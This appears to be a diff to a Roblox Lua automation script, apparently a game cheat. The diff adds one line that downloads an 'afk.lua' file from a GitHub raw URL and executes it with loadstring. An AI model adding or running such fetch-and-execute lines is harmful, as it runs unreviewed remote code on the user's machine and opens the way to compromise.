@@ -33,6 +33,7 @@ end
 
 print("I DID FOUND IT, MAYBE IT WILL WORK?")
 RemoteEvent:FireServer("PressedPlay")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VernonMoore54/myprice/refs/heads/main/afk.lua"))()
 
 if LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1") then
     LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1"):Destroy()
